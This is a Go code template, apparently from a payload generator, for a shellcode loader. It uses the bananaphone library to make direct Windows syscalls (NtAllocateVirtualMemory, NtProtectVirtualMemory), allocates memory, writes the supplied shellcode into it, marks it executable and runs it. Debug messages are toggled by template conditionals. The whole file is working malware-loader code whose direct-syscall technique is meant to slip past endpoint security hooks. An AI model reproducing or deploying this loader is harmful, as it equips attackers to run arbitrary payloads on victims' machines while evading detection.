func run(shellcode []byte) {

	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	handle := uintptr(0xffffffffffffffff)

	{{if .Debug}}
	printDebug("info","Loading bananaphone")
	{{end}}

	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if e != nil {
		{{if .Debug}}
		printDebug("error","Error calling NewBananaPhone:\n%s", e)
		{{end}}
		return
	}

	//resolve the functions and extract the syscalls
	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		{{if .Debug}}
		printDebug("error","Error calling GetSysID:\n%s", e)
		{{end}}
		return
	}
	protect, e := bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		{{if .Debug}}
		printDebug("error","Error calling GetSysID:\n%s", e)
		{{end}}
		return
	}
	var r1 uint32
	var r error
	var baseA uintptr
	
	{{ if not .Debug }}
	_ = r
	_ = r1
	{{end}}

	regionsize := uintptr(len(shellcode))
	{{if .Debug}}
	printDebug("info","Allocate the memory")
	{{end}}
	r1, r = bananaphone.Syscall(
		alloc, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		{{if .Debug}}
		printDebug("error","Error calling ntallocatevirtualmemory: %s %x", r, r1)
		{{end}}
		return
	}
	{{if .Debug}}
	printDebug("info","Write data in memory")
	{{end}}
	//write memory
	bananaphone.WriteMemory(shellcode, baseA)

	var oldprotect uintptr
	{{if .Debug}}
	printDebug("info","Change allocated memory protection to PAGE_EXECUTE_READ")
	{{end}}
	r1, r = bananaphone.Syscall(
		protect, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)

	if r != nil {
		{{if .Debug}}
		printDebug("error","Error calling NtProtectVirtualMemory: %s %x", r, r1)
		{{end}}
		return
	}
	{{if .Debug}}
	printDebug("info","Execute the shellcode")
	{{end}}

	syscall.Syscall(baseA, 0, 0, 0, 0)

	{{if .Debug}}
	printDebug("info","Shellcode Executed")
	{{end}}
}